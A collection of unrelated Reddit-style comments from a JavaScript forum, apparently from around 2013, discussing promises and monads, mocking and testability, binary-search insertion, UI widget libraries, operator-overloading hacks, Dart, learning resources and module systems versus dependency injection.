So with promises of each step returned one then you could chain it like firstFunc(a).then(function(a) {return secondFunc(a) }).then... I an get into more details when I'm at a real keyboard (on my phone now) 
That isn't the only way. In another post I got into various ways you can use Sinon.js to spy, stub, and mock functions http://www.elijahmanor.com/2013/06/unit-test-like-secret-agent-with-sinonjs.html The content from the "6 Examples of Hard to Test JavaScript" came from a course I did for Pluralsight. At that point, I hadn't yet covered the concept of stubs/mocking so I didn't show that yet. However, generally I think anonymous functions are overused. They don't encourage code reuse and don't make it easy to test... although you test them using various techniques. I'm not saying don't use anonymous functions as I use them frequently. I guess the main point is to think twice about it. Thanks for your comment. 
I'm not opposed to using closures or IIFEs... on the flip side I use them all the time. Yes, using stubs or mocks is a great way to test hard to reach places, however, I hadn't covered that topic yet when I was introducing the concept of unit testing and things to possibly look out for. The above articles is part of a whole course where there is another section covering Sinon.js showing spying/stubbing/mocking, etc. http://pluralsight.com/training/Courses/TableOfContents/testing-and-prototyping-javascript-apps Thanks for your comment. 
No, they are from external sources. Edit: The solutions are all mine, the problems are not.
Speaking of which, anyone interested should probably be keeping an eye on the upcoming DOM Futures spec, which "promises" (sorry) to make cross-browser futures/promises a reality.
Awesome, thank you!!
Bind takes a wrapped value, a function that takes a normal and returns a wrapped value, then returns a wrapped value. [Here's](http://jsfiddle.net/WdnnT/) a list monad implementation. The only difference between the OP's post and this, is my values are wrapped in lists, his values are wrapped in callbacks. For another (maybe) monad [more](http://jsfiddle.net/FFM5t/), as an exercise you could try to implement the either monad from haskell, which either returns a left which is an error with a string or right which is a value. We still have no-where near haskell's do notation power though as we can't do something like do x &lt;- [1, 2, 3] y &lt;- [4, 5, 6] // return is haskell's unit (// is also not haskell's comment but oh well) return $ x + y which would desugar to bind([1, 2, 3], function(x) { return bind([4, 5, 6], function(y) { return unit(x + y); }; };
Mocks are sloppy. Code should be inherently unit testable. Integration tests would cover the full stack. I don't know how mocking gets so much support - "in order to test the code I have to modify it runtime". That makes 0 sense to me. Instead, it should accept data and operate on it, and then later be utilized in a similar manner in the production setup. I'm not sure why your coworker would argue his point - there's nothing against with using any of those things so long as the javascript exposes some interface or contract that can be validated with the proper data. Encapsulation is a good idea, and is not unique to OOP. functions are a form of encapsulation as well.
Have you looked at [jquery's deferred object](http://api.jquery.com/category/deferred-object/)? 
Awesome! Great job there!
requirejs isnt' used for dependency injection, it's used to give Javascript something equivalent to "import" or "use". It's not really the same thing here.
Beauty. Good luck with the interviews out west ;)
I believe It actually still could be leveraged to accomplish what you're trying to do.
www.youtube.com/watch?v=v7oBAnEmklk Jiffy! 0:57-1:00
I'm not going to explain the entirety of strict mode when it doesn't pertain to the original question, he asked how would it make things faster as an aside, and I answered as an aside.
Although it displays fine on mobile, it's not really easy to use...
and what if someone is not using AMD or has their own way of lazy loading JS files? this is why we don't directly support any particular form of AMD. How do you imagine it can be leveraged to make a nice flow for DI?
That is probably true. JavaScript needs to completely drop the new keyword and make polyinstantiation for API resources outside the proper language automatic.
Holy God my brain 
Part of my soul dies each time at the utterance of design patterns.
Awesome, I'll add these now.
But it doesn't scale to hundreds of items.
For now, my solution is to popup a modal dialog box with the select2 widget in it. The dialog box is pinned to the top half of the screen. That way I can keep it from being obscured by the keyboard. 
Great post. While I don't normally recommend messing with built-in prototypes, you can add some Haskell-like syntax by adding the bind function to the Function prototype: Function.prototype['&gt;&gt;='] = function(f) { var M = this; return function (onComplete, onFail) { M(function (result) { f (result) (onComplete, onFail) }, onFail) } } Which results in usage like: unit (url) ['&gt;&gt;='] (getFoo) ['&gt;&gt;='] (getBar) (onComplete, onFail); 
It's true that it has lots of ways to log data and they can be complex. However, I chose JSON over HTTP which makes it quite simple. The only API is a HTTP POST with a JSON body. You are then able to query this JSON with a simple DSL in the loggly "shell" which gives you quite a lot of power. 
I've been using [Chosen](http://harvesthq.github.io/chosen/), any reasons to switch to select2?
Return the 2s compliment (~) of currentIndex at the end and then you'll know the index of where it _should_ go in the array so you can splice it in if you want.
I was thinking about how you would add to the array without having to re-sort the entire thing. This seems like a nice way of doing it. The only thing is that you won't know when it didn't find anything, there would be no -1 any more. Right? It's a pretty neat idea though. I guess you really want a set implementation then, so you can push without worrying about duplicates and ordering. Have the set insert at the correct location. I really want to write a couple of posts about maps and sets which can use a binary search too. **Edit:** Oh, wait. Would this mean that you return the negative value of where it should be inserted? It strays from the normal indexOf implementation of only -1 when not found, but it's pretty elegant. I like it.
Yes, check for &lt; 0 instead of === -1 to mean not found, and take the 2s complement again to recover the index.
I've just updated the post, it now incorporates your suggestion at the bottom. You can see it running in [this fiddle](http://jsfiddle.net/Wolfy87/5dcWN/). Works really nicely actually. Thanks a lot!
Be careful. It's not quite the negative index, because 0 will return 0 even when it's not found. Use the tilde operator for 2s complement in JavaScript (~).
I had to switch from Chosen because it didn't support disabled options. When an option is marked as disabled, it is removed from the list, as opposed to being ghosted/greyed-out. It's possible this has been fixed but the author never responded to the (fairly large) thread addressing the problem. 
Why are you storing the matches inside your configuration object instead of just using a local variable there? ~~words~~ **Edit**: ``*?`` means lazy matching, I stand corrected. You might need to end your regex with ``/g`` to recognize all matches (global) instead of just the first. This also won't work correctly for nested BBCode, because BBCode is too complex a language to be parsed by regular expressions. See: http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags **Edit**: While we're at it, standard warning about rendering arbitrary user input as HTML, because it could be used to compromise your site.
That's pretty cool and I had no idea that was possible. Coming from a c++/physics programming background, it's hard to give up operator overloading, so something like this makes WebGL more tempting. I'd be willing to use a hack like this, even if it's slow, to get operator overloading at least temporarily for development purposes.
Just for fun. :-) 
&gt; This is a dynamically typed interpreted language and does not need the complexity and overhead of a DI framework. What does being a dynamic language have to do with not needing a DI framework?
No.
You might like Dart. It got operator overloading, proper lexical scoping, optional types, classes, good tooling, and things like that. If you're doing WebGL (or 2D canvas stuff), Dart's lack of IE8 support won't be an issue. class Vector { final double x, y; const Vector(this.x, this.y); // shorthand for "this.x = x" etc Vector operator - () =&gt; new Vector(-x, -y); Vector operator * (double s) =&gt; new Vector(x * s, y * s); Vector operator - (Vector v) =&gt; new Vector(x - v.x, y - v.y); Vector operator + (Vector v) =&gt; new Vector(x + v.x, y + v.y); // ... String toString () =&gt; '($x, $y)'; } main() { print(new Vector(1.0, 2.0) + new Vector(3.0, 4.0)); // (4.0, 6.0) } The tooling also helps quite a bit: http://i.imgur.com/b49oZl0.png I was also able to auto-complete "createShader", because the editor knows that `getContext3d` returns a `RenderingContext` (because it was annotated as such), which does have a `createShader` method.
But this is not real operator overloading -- it's a fragile hack. To implement it at all you have to understand how it abuses valueOf and requires side effects (that are probably incompatible with each other) to even work in the first place, so you're making it harder to think about your own code. If you used it during development you'd really want to go through and replace it before releasing anyway. You would not get any real value -- why would you do that to yourself?
Just because you can doesn't mean you should.
I’m the author of the blog post and I have to agree with bonafidebob: It’s only a hack and you should *not* use it in practice (but I think it’s fun and educational). There is hope, though: some kind of operator overloading will eventually be in JavaScript, but it might take a while (ECMAScript 7 or 8).
I respectfully disagree. The problem with design patterns is that most are ways of getting around developer deficiencies.
Dart is nice but I like TypeScript better because it stays real close to the plain JavaScript. This goes so far that if you rename a .js to .ts it's allready valid TypeScript, and then you can add the typing and tasty sugar. So it is an enhancement and not a replacement. Also it allows the community to define typing declarations for existing vanilla JavaScript libraries. Makes editing very easy (lazy :) and has nice compile validation step without adding runtime code. React looks cool but a bit odd in it's opinions. What I like better is [Polymer.js](http://www.polymer-project.org/) and how it is trying to polyfill the next-gen HTML stanards. That got me way more exited; largely because it's using/enabling the up-and-coming webstandards like Web Components, ShadowDOM, HTML Imports, Custom Elements and stuff like that.
Why wait, since it will never get in to the specification? Instead, try taking a look at Custom Elements with Google Polymer. http://www.polymer-project.org/ http://www.polymer-project.org/platform/custom-elements.html You can get this in HTML5 today. 
It should support every options of datatatables out of the box. http://www.datatables.net/release-datatables/extras/Scroller/index.html The problem is testing is I'm not sure what to test. Should I be testing if my data has loaded correctly or if my tables has been generated correctly? or both? Do I the test against the DOM or just the data? In backends, I tests model and controllers. Now that the DOM is involved I'm all lost. 
Learn by doing. You'll have the most fun putting finger-to-keyboard, and you'll retain a lot that way. Start with small problems, and post your code for feedback either here or in [/r/learnjavascript](http://reddit.com/r/learnjavascript), to make sure you aren't doing clowny things.
I was involuntarily reclassed from a designer to a developer at the job and told to learn JS. I had recently taught myself XML Schema and CSS a year before, so now I write JS exactly like I would write a markup language with lots of nested scopes. I learned to embrace the language and found OOP to be unnecessary and excessive, so I never use "new" or "this".
By force and coercion. 
I use opera and I wanned a very specific starcraft related extension that both chrome and firefox already had. So I looked in to how to make it... It was incredibly easy to make first version because opera dev guide had example that basically did what I wanned and because core of chrome extension was the same, I just needed to get some understanding how it does what it does. Then I started to adding features and polishing it, then I got some ideas for some other reddit related extensions, or porting good extensions from chrome to opera, and I learned as I worked on that... Its was far more enjoyable for me to learn when I had some idea of a project, instead of just going through chapters in books or online courses with no real objective other than to learn. Though on the other hand, without the good foundation and big gaps in my knowledge, I often felt like shit trying to solve some issues, or reading some huge api documentation, or trying to incorporate some jquery plugin and shit... [Here](http://www.reddit.com/r/operabrowser/comments/t6lsi/how_to_get_in_to_extensions_development_with_zero/) I wrote in opera subreddit how to get in to making extensions several weeks after I started myself. Anyway I would not say I learned javascript, just some advanced beginner... I only recently started to use jshint and I already had several extensions out and working when I learned that I cant copy object with just equation sign heh 
codecademy.com I highly recommend this website, there I learned, CSS, HTML, JS and ruby, I love this website
I learnt it by reading [Eloquent Javascript](http://eloquentjavascript.net) and by writing a Firefox add-on. Highly recommend the former, but I wouldn't necessarily recommend the latter. The Firefox Add-on SDK can be a bit frustrating for beginners IMHO. If you want to do a little project, do some web page stuff or have a look at [Node.js]( http://nodejs.org/).
Nice work! 
David Herman is a Ph.D in computer science, and wrote Effective Javascript, its probably the deepest js book I've found. http://effectivejs.com/
Don't forget http://2ality.com from Mr. Dr. Axel Rauschmayer. Some really deep JS articles. Awesome stuff!
You want to be lazy*
Thanks, I had no idea that was a valid email address. I'll do some more research on it and rework it. 
I believe Select2 is a fork of Chosen which provides more features, retina support and others. We switched our projects a while ago.
This is about as unsemantic a tag as it could be. &lt;ascii&gt; only holds stylistic informations about the content. If you really wanted to incorporate something like that, you should propose the .jsf (JS font) extension to the CSS3 @font-face API as a part of HTML5 (allowing JS to render fonts in any way it could, e.g. ASCII art).
On Friday I found a qunit test file for a component full of fake tests. There was a test for every function in the component library, but none of them actually called the functions they claimed to be testing. They created a bunch of mocks, and then tested that the mocks returned the correct fake data. I can't decide if the author was lazy, maliciously trying to dupe someone, or just grossly incompetent.
Not so much stupid javascript, more stupid developer
You could use the built-in profiling and trace options in v8 to get a better insight into most of this, in particular --trace_gc and --prof. --trace_opt, --trace_deopt and --trace_bailout might also be useful for making sure everything in the program is optimising well.
I'm actually a bit shy to show code. I'm a beginner so my code is terrible-looking and probably ill-structured. Let me see if I can find an example out there for you. 
It doesn't matter how bad your code is as long as you are able to take some criticism. (and learn from it!) Everyone was a beginner once.
Everyone starts out making awful code. :) Don't worry about it; we can point you in the right direction. Show us what you've got.
Try making a simple calculator first, then add your features later.
Alright - published as an edit to the OP with some notes. Peruse at your own risk!
Cheers - taking a look now! First comment, before anything else... test stuff using console.log(whatever) instead of alert(whatever), it'll make things easier ;)
Thanks! I'll start doing that. It's the equivalent of &lt;pre&gt; + print_r() in PHP, right?
Thanks for the tip and looking forward to your comments on my code. angular seems like a great alternative. I'll look into it.
Of course you are. So many people get caught up with titles. Call yourself what you want. Javascript teaches many programming principles applicable in other languages: dot-notation, prototypes, and of course the standard functions and loops. I personally prefer the generic term "developer"
If you ran C in an interpreter would you cease to be a programmer?
Next time anyone says that Javascript is just scripting, then ask them whether Google Maps is just a script.
Pretty much, but in the javascript console rather than in the html. The console's also pretty handy for testing out functions and things, too - just type in anything ( e.g. new Date() ) and the returned value will be displayed.
Maybe http://developer.yahoo.com/finance/ ? I know Google killed their finance API... https://code.google.com/p/yahoo-finance-managed/ 
I do pages mostly. 
Nice :)
Or developer if you Do web pages mostly? 
I've tweaked your code, but there's a lot to go through and explain, so [take a look](http://rainbowlemon.co.uk/js-camera-test/) and then read through the comments I've left in the source. (Also check out the console log - as I mentioned early, this should be a vital part of your development workflow!) Basically, in short: - Don't use global variables - An object-orientated approach is generally more expandable/flexible. It's also a lot easier to get your head around that array manipulation, in my opinion! - I wasn't sure on your exact use-case, so I just created an example - Try to avoid writing to the document multiple times - Save things in variables so you dont have to re-reference them - IDs should be unique - Keep your DOM manipulation and your object/data manipulation as separate as possible. You should be able to copy-paste your data manipulation functions somewhere else and it work fine! I'm sure many people more experienced than I could add to this, but it's a start :)
Dot notation is just syntax, not a principle. Whether JS should be called programming or scripting depends solely on what you do with it. Asm doesn't have any of the concepts of high-level programming languages, but that's programming if anything.
I had always wondered what kind of things you could mess with if you played with .toString and .valueOf since js uses them so often. Thanks for awesome post, was fun to read and looks like it would have been pretty fun coming up with it.
Rainbowlemon, this is awesome. Thanks for taking the time to create this. It'll take me time to go through it but I will. I'll msg later tonight. Again, thanks!
What types of positions ask these questions during the interview? They are indeed fantastic, but might be overkill for garden-variety front-end developers? 
http://www.webservicex.net/stockquote.asmx?op=GetQuote
How many Project Euler problems have you done?
IE8 has a rudimentary profilier in its debugging tools, IIRC. Hit F12.
I'm guessing from your terminology that you're using Dojo. If this is incorrect, please clarify your question. Dojo widgets provide a method called *inherited*. You don't need to know all of the parent classes of the Widget in which you are operating, and - in fact - calling them in the way you suggest may have unintended side effects. Instead, declare the *init* function of the class in which you are working to include the line *this.inherited(arguments)* See here for details: http://dojotoolkit.org/reference-guide/1.9/dojo/_base/declare.html#inherited 
setImmediate is available in node.js, it offers the same performance as process.nextTick, just slightly different semantics (nexttick executes *before* the current event loop ends, setimmediate *after*).
I have no freaking clue what Euler is, Lol.
Well... widget (object/psuedo classs) function widget () { this.instances = []; this.register_instance = function(obj) { this.instances.push(obj) } this.unregister_instance = function(obj) { this.instances.substring(this.instances.indexof(ob),1); } } concrete class that inherit from widget constructor function a_concrete_class_constructor() { this.register_self = function() { register_instances(this); } this.init = function() { //do something } } //prototype chaining somewhere to widgets... This is my half ass attempt. But yeah... you just have an array in widget to keep track of all instances of sub objects/classes/pseudoclasses. Those concrete "classes" have to register themselves to the instances array. Is this what you're asking for? So if you want to access all the concrete classes... you can iterate through each array in widgets this.instances[i].init() edit: I didn't really try to code. the syntax is probably wrong but hopefully you get the gist of the logic.
Kind of getting it, thank you heaps for the input. Going to go over the code again with this in mind.
Thanks for this. I had never heard of dart but it looks like it could be a nice tool. It might actually be a good option if writing a WebGL app from scratch, since there would be no code to port and the language looks familiar. The IDE would be nice to have, particularly for the game programming world, which works mostly in MSVC. I don't mind javascript for the most part except for the lack of operator overloading. Lua is my preferred scripting language right now but it is not perfect (one-based indexing). I would easily switch to javascript.
Profiling JavaScript typically means calling out functions by name and identifying the frequency at which functions execute and how long each execution runs. In my own code I completely detest hoisting, so each and every function is either assigned to a variable or is an immediate invocation. Internally to the code, however there must be a proper function name or the function will be anonymous in the profiler, so I also name the functions as well. Here is an example from my own code: var asi = function jspretty__tokenize_asi(z) { The variable *asi* is for me to use when calling the function or extending my application. The name *jspretty__tokenize_asi* is what displays in the profiler. To the best of my knowledge modern profilers do not benchmark objects. Objects do not contain scope and do not contain statements. Furthermore, object literals are the slowest form of containment to access in JavaScript. If are able to trade object literals for arrays your code will likely become more verbose, but will likely execute faster particularly so as the objects grow larger.
Iv tried using this but as you say its very basic and did not give much information
No idea why there aren't any comments. This is the kind of stuff that I love. Enjoy your upvote.
This is an incredibly detailed and in-depth article. Saved.
http://bonsaiden.github.io/JavaScript-Garden/
&gt; I had never heard of dart but it looks like it could be a nice tool. Just test drive it for a day. The [editor zip](http://www.dartlang.org/tools/editor/#download) contains everything you'll need: the SDK, Dart Editor, and Dartium (a special build of Chromium with native Dart support for a seamless developing/debugging experience). &gt;the language looks familiar It does indeed. In general, it also just works like one would expect. There is no weird type coercion going on, there is proper lexical scoping, and `this` is always exactly what you think it is. Closures also work more like most people seem to expect. For example this prints "1": var f = []; for (int i = 0; i &lt; 3; i++) { f.add(() =&gt; i); } print(f[1]()); // 1 Doing the same in JavaScript (which is a very common mistake), however, prints "3". var f = [], i; for (i = 0; i &lt; 3; i++) { f.push( function () { return i; } ); } console.log(f[1]()); // 3 Fixing it in JS requires an IIFE: var f = [], i; for (i = 0; i &lt; 3; i++) { f.push( (function (k) { return function () { return k; }; }(i)) ); } console.log(f[1]()); // 1 Or ES6 and a temporary variable: let f = []; for (let i = 0; i &lt; 3; i++) { let k = i; f.push( function () { return k; } ); } console.log(f[1]()); // 1 If you want to know more about Dart and the motivations behind it, watch some of the Google IO 2013 talks: http://news.dartlang.org/2013/05/strong-dart-presence-at-2013-google-io.html
there is no interface or contract in javascript, because everything is dynamic. And the use of private variables is not encouraged. You dont code in javascript like you code in Java. If you try you will fail. There is no "design by contract" in javascript since they cannot be enforced.
JavaScript is a programming language all right. It's got variables, types, operators, conditionals, loops, functions, statements, the whole lot. If you just write code without creating the inherent logic that it tries to implement, you're a plain programmer. If you develop that logic yourself, regardless if you do the actual programming, you are a developer. If you just try to copy&amp;paste random stuff that you found on the web, you're probably a script kiddie. Remember, these terms are just job descriptions and say nothing about how well you perform. As a frontend developer, I like to call myself "browser whisperer". Even though it's a rather fuzzy description, it tends to get the girls :)
Javascript already have mixin built it. function1.call(function2.prototype) http://javascriptweblog.wordpress.com/2011/05/31/a-fresh-look-at-javascript-mixins/
It's pretty good, been using it for more than a year. It took forever to figure out how to use the pagination api. I created an Erlang standard library search website with it. Sadly parsing the Erlang doc is so time consuming that I gave up on the project.
I'd say a programming language has loops, functions, variables and sometimes is object-oriented. So I think Javascript is a full programming language. Whether it's compiled or not is irrelevant. I do a lot of neat stuff with Perl though it's not compiled. 
Yeah, sure. There's not much to it if you're just updating the site to add a link. If you made an administrator page, to edit the links via a login, then it would require more effort on your part. Just editing a page though, that's a simple [&lt;a href... /&gt;](http://www.w3schools.com/tags/att_a_href.asp) tag.
In what are you working? Are you writing browser side javascript, java, php, c#, node.js or something more funky? 
This sounds like a trainwreck. What is it _specifically_ that you need to do? Is this a school project of some sort? This subreddit is about programming in javascript, and if you're not a programmer, then this sub is going to be useless to you as will the Javascript that you're trying to scrape. I'm not sure where else to send you, but I'm almost positive that what you're looking for isn't going to be found here.
A slightly different philosophy: https://github.com/raganwald/YouAreDaChef
Am I missing something, or is there really nothing new here to see? I guess this is a good overview of module formats, but noticeably absent are the [ES.next proposals](http://wiki.ecmascript.org/doku.php?id=harmony:modules)...
Make a back up of any code you write, even code you don't think you need anymore. It's better to have it and not need it, than need it and not have it. Do as Miss. Frizzle says... &gt; ...Prepare to take chances, make mistakes, and get messy!
Ok. Do you have experience with writing any kind of code at all? Like, if I told you to delete a certain folder, but you can only use your command prompt, could you do that?
I probably should put together a list of other AOP libraries and tack them on the end
I guess not. The thing is I dont have access to those webpages. So I cant delete folders. I just want to check my list of URLs. Some of them have a certain code snippet within the &lt;noscript&gt; section of the &lt;div id="all"&gt; section. I just want to find out which of them have this code snippet in their source code.
The folder deletion was just an example; you could use something like cURL or wget probably for this, but if you're not familiar with the command line, then it's going to be an uphill battle. If anyone here had the time, this could be done I'm pretty sure, but it would take at least 30min and maybe an hour or 2. Unfortunately, I have my own job to do and don't have the time to help to that extent. Unless it's 1000's of URL's, you might as well just do it by hand...
I like your post. The "comparison of libraries" is another post entirely :-)
ok thanks...I will get to this somehow ;)
The blog spends much more space explaining what this particular type of tunneling is not than what it is. It's also not completely clear how much value this has. It seems like this would only run on Chrome, and Chrome itself is adding better support for tcp relays. So it seems like this would only matter to folks that are writing web apps that are only meant to work on the latest chrome, and can't wait for webrtc implementations to improve. Still, I'm curious about what it is they're doing exactly, and I wish they'd go into a bit more details about it. 
IMHO asynchronous JavaScript is ugly without generators, since you need to wrap each part in a function, which shouldn't be necessary. [Bringing async/await to life in JavaScript](http://bjouhier.wordpress.com/2013/06/01/bringing-asyncawait-to-life-in-javascript/)
Google it :|
Weird coincidence, but I was writing a RegExp for this exact same purpose this morning and came up with something that worked but was much more complicated. '\^' + word + '\\s|\\s' + word + '\\s|\\s' + word + '$' Your solution is much more elegant, so thank you!
A guy I work with wrote something similar and extremely minimal. It is mostly a wrapper to simplify your life when working with generators: https://github.com/jmar777/suspend
if a concept cant be enforced by strict rules when applied , then it is worthless.Things that are valid in a paradigm are not in some others. that's why there are different paradigms , some apply to javascript , some dont. You just dont design by contract in javascript. 
Really nice! I'm personally a fan of the expand-right one.
I enjoy the loading bar one.
Namespacing deserves to be bashed. When you use namespaces, you're writing programs against mutating global state where the order of those mutations is significant and needs to be carefully controlled, especially when you need to express inter-dependent relations. When you use a module system like what node-style require() calls give you, the computer can resolve the entire dependency graph for you completely automatically. The beauty of the node-style commonj-esque approach is that there is no require.config(). You don't even need a package.json. You just use static analysis to trace out your entire require graph so you don't need to laboriously enumerate your dependencies all in an array at the top of your file, taking extra care to line up each module name with the variable under which the variable will be exposed. AND, you can run parts of your codebase that are not specific to browsers or node without any modifications at all. With namespaces or AMD, there is so much more boilerplate and manual hand-hacking to get anything to work at all.
I love this concept.
Ladda fett! This is really slick. The second example of the built-in progress bar looks a bit broken to me though. Also, how are you supposed to show actual progress on something like submitting a form?
Okay :|
Oh you fancy!
Very Helpful, Thanks! :)
Thanks. :)
Right on. I'm creating a page almost like Reddit and Wikipedia had a baby. I post like two articles on what is happening in the world, then below is a link section divided into topics, (News, Technology, etc.) The thing is though, should I, hypothetically, start some kind of company for this with employees and whatnot, I need to have an official description for us, and if we are just doing js it needs to make sense if we call ourselves, 'Programmers'. 
Very cool - built in progress bar is very clever.
Link to the performance test: http://jsperf.com/binaryindexof-and-indexof
I want to make random pictures on my homepage from a certain subreddit(s). Unfortunately get error text returned to me. How would this be possible?
Try JavaScript: http://tryjs.tistory.com/
You have to get your story straight mate. What you claim is simply not true. Meet [Mantri](http://thanpol.as/javascript/announcing-the-release-of-mantri), a Dependency Management System that uses Namespaces. Build on top of Google Closure Tools Dep System that google uses for most of its web assets. I go into depth about why [AMD is actually problematic when developing large scale](http://thanpol.as/javascript/why-i-dont-like-amd-and-what-i-will-do-about-it) and how [developing using namespaces](http://thanpol.as/javascript/development-using-namespaces) is nothing but a bad practice.
Or just hit F12 key?
reminds me of [Wat](http://www.youtube.com/watch?v=kXEgk1Hdze0)
So instead of using explicit `var map require('app/util').map` calls to depend exactly on the parts we need, we should rely on kitchen sinks of grab-bag functionality by calling a `provide('app.moduleA')` function which magically, implicitly puts its functionality into `app.utils.map()`? Not only is our code now tightly order-dependent, but the linkages between the imports and where the code is used are now highly coupled and governed by an implicit ruleset specified from a spooky distance, making refactoring and maintenance a nightmare. I think you're actually better off with using globals than what you're advocating here.
Code is code. I don't see why these design principles should go out the window just because web applications are involved, particularly when sophisticated tooling now exists to extend these principles into browser code organization.
btw, don't get me wrong. I am not advocating against anything you state. I'm merely illustrating what i consider a modular Web App / Lib to be and what are the options for structuring and distributing one.
typeof [] === 'object'; // true
Array.isArray is a much cleaner option: Array.isArray(dIsArr) // true
Languages with plot twists, mate. Arrays in JavaScript turn out to be objects. Strings in C turn out to be pointers to them first characters. Lists in Lisp turn out to be pointers to them first cons cells. Lambdas in Python turn out to be not really lambdas. Not to mention English. Why is there a 'g' in 'night'? 
What a great display of ignorance about how javascript arrays work.
Hey, I can do stupid things that I know are stupid and the language isn't stopping me! Screw flexibility, JS must suck!
Thanks. That;s probably one of the most important parts of the whole thing. I'm just amazed at how fast it is, even on small amounts of values. It beats indexOf by a long way with 50 and 100,000 values in the arrays. I guess the only draw back is that your arrays have to be sorted. So if you are working with data that can be sorted you can easily obtain a pretty large performance boost.
I think he is *basically* advocating namespaced globals. At it's most basic it's sort of like assuming jQuery exists so you don't have to bundle it in the build process. Think about it this way, in the build step you bundle your code in to modules, some of those modules will be loaded later, say when a user selects to see a new feature. Let's say your project uses jQuery, now the second module you're downloading that was built requires jQuery, but the build tool doesn't know that jQuery has already been loaded in to the page (say with the first module), so with a require it would have to include the jQuery code in the module (this is assuming that jQuery can be bundled in the code). So instead with dynamic loading we assume that namespace is available and use it within the code that will be loaded in the second module so the require is not put in and it's not bundled. This means you don't have to load jQuery again. Notice this is for front end code. Things are a little different in node land where you're not considering the network effect of loading code
&gt;JQuery JS &gt;JQuery UI JS + CSS &gt;Bootstrap CSS &gt;Lodash JS &gt;Modernizr JS I'm a bit confused, why do you list CSS files as a 'Need' to use your plugin? Also if possible reduce the number of dependencies to 0 or make this a plugin to a FW (jQuery or other). If you already did this, cool, but the docs make it confusing.
I'm disappointed he didn't try: var x = []; x[Math.pow(2,40)] = 3 x x[Math.pow(2,30)] = 3 x
It's not available everywhere. IE9 is the first IE version to have support 
&gt; function import() {} SyntaxError: Unexpected token import In chrome I don't get that...I get: function import() { } SyntaxError: Unexpected reserved word
I was out of the loop with the newest ES6 definitions, and I didn't want to write about something I wasn't entirely familiar with, so I've left ES6 modules out. I'm reading back on the latest threads on the ES6 modules development, and might need to ask David and Sam about some specifics as well, so I can write a follow up about ES6 modules (which is something I told Brendan I'd be writing a few months ago, but never found the time to).
Also: http://lisperator.net/uglifyjs/parser
Also: http://www.reddit.com/r/javascript/comments/18bd61/middlemanjs_a_new_open_source_library_for_hooking/
I'm not sure where you got the idea I've "bashed" namespaces in that article. I'm pretty sure the only thing I said was that "namespaces **do not** solve modularity problems", which is correct, they only solve name collision problems. Namespaces and modules are necessary in a program, because at the end of the day, you need somewhere to store the bindings (the namespace). Modules exist within namespaces, but namespaces themselves are not modules. My complaint is with people who say that namespaces themselves are modular, since they don't define a component boundary with its dependencies and constraints, they're just a "bag of names". In Node modules you have namespaces: NPM goes basically with a flat one, but this works because you have a central regulator (the repository), which forces you to resolve conflicts before they actually bite people in their arses. Dependency injection is a pattern. Patterns are inherently bad because you can not abstract over them — and abstraction is basically the most important thing in a programming language, it allows you to clearly convey the meaning of what you want to say. Parametric modules and dependency injection serve the same means: to allow one to avoid hard-coded dependencies. But parametric modules do it better because it's something that follows the semantics of the language you're working with, and is something you can abstract over. 
`require` is just a module loader. Modules are neither tied to files nor loaders. The thing about Node modules (and `require` in particular, in this case), is that you fully declare your component **inside your component** (where component == module). Thus, your component becomes a self-contained thing. The decision of statically linking to another component, or deferring the decision of which implementation (component) to use is easily supported by making a parametric module. And this comes with the added benefit that you can enforce the constraints of which components you can pass to a parametric module using the semantics of the language, rather than some alien external tool.
Break up the form processing into small steps: 1. Form validation: each field is one step. 2. AJAX request sent 3. Response received 4. response data parsed. you get the gist.
parametric binding is only good when you can dynamically decide on the module with little or no cost. This isn't so in the front end world. Also the module is not a self-contained thing. You are calling a module in to it during run time of the module rather than at declaration. This is a bad thing for both testing and debugging purposes as you don't know how it may act when it is instantiated. Also the actual logic for which module should be loaded is handled by the module loader, you tell it which one to load but it's up to the require function to decide what that string wants you to return. That's not much different to passing through a factory and then grabbing what you need by asking the factory for module. Choosing which implementation to use is all part of DI. You should choose which implementation to pass to a constructor, not which module to *load*. 
DI is a pattern, but I don't think I've ever heard anyone say that patterns are bad before, nor do I believe that you can't abstract them. Use DI, pass in a factory and then that factory can decide what to return when you ask it - that's exactly the same as using a parametric module except you control the factory rather than rely on the require function. In fact we've just abstracted the require function, because you can put that inside the factory! once you've put in the 'require' you've lost that abstraction, you no longer control how things are loaded. So if anything it's the opposite way around. for the namespacing you basically said namespacing is *just* for preventing name collision (there are more advatanges though) and didn't explain how namespacing can co-exist with modules. Then in the later namespacing paragraph used these phrases: "half-baked solution", "Oh, the naïvety". I don't think there are many proponents of ONLY namespaces, and I believe the code for namespacing is a lot cleaner than what you've put (in closure: goog.provide('com.myCompany.myPackage.someOtherDumbThing'); com.myCompany.myPackage.someOtherDumbThing = {blah: fn...} would be the equivalent). 
I think you're confounding the general term "Module" with a particular way of defining a "Module". A module *is* an instance (at least, in the case of it being first class). In JavaScript right now, a module is an object that provides you a particular set of functionality fulfilling a particular interface. A "module" is not a file. A "module" has nothing to do with "require". A "module" does not determine how it's defined. It's just an object. myApp.Stack = { push: function(){ ... }, pop: function(){ ... } } Is just as much of a module as: module.exports = { push: function(){ ... }, pop: function(){ ... } } Except that in the case of Node modules you get, besides first-class and straight-forward parametric modules: - A way of resolving a particular identifier to a file, loading the definitions in that file, and returning the resulting instance (object/module) — `require()` - A way of managing dependencies easily by way of the NPM tool. Again, dependency injection is bad because the details of the binding are external to the component. This is both complex and easy to break as your application gets bigger (more dependencies, etc). Let me put it another way. What if instead of saying: class Foo extends Bar { ... } You had to say: class Foo { ... } And then, somewhere else: extend Foo Bar; What are the semantics? How do you enforce these constraints? How do you tell your users (other developers) that these two concepts are related, or that the `extend` part is quintessential to the concept of `class Foo`? Notice how `class Foo extends Bar` is much more straight forward? In this case, it gives you static binding, however, which is the first thing Node modules allow you to express. But then it also gives you straight-forward parametric modules, which give you something akin to generic types, but for "classes" (in our example): class Foo&lt;A :: Bar&gt; extends A { ... } Which means, Foo, when instantiated, takes a parameter A which provides the interface Bar. Then people can provide their own implementations of Bar: var fooInstance = new Foo&lt;BarImplementation&gt;(...) In Node modules, you again get both of these straight-forwardly, with static binding: var bar = require('bar') module.exports = /* something that uses bar */ With parametric modules: module.exports = function(bar) { /* something that uses bar */ }
